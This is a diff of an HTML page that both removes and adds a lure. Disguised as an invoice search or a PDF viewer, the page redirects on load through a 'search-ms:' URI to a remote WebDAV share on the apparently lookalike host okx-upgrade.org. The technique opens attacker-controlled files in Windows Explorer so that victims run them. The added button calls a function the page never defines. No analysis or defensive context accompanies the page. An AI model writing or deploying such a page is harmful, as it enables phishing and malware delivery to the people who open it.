@@ -1,15 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Invoice Search</title>
-  <script>
-    window.onload = function() {
-      window.location.href = "search-ms:query=LawsofHumanNature&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\DavWWWRoot&displayname=Search";
-    };
-  </script>
-</head>
-<body>
-  <h1>Opening Invoice Search...</h1>
-  <p>If nothing happens, your browser blocked the request. Try opening the .url file instead.</p>
-</body>
+  <head>
+    <title>Open in Windows Explorer</title>
+    <script>
+    window.location.href = 'search-ms:query=LawsofHumanNature&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\DavWWWRoot&displayname=Search';
+    </script>
+  </head>
+  <body>
+    <h1>Click below to access the PDF via Windows Explorer</h1>
+    <button onclick="openExplorer()">Open in Explorer</button>
+  </body>
 </html>
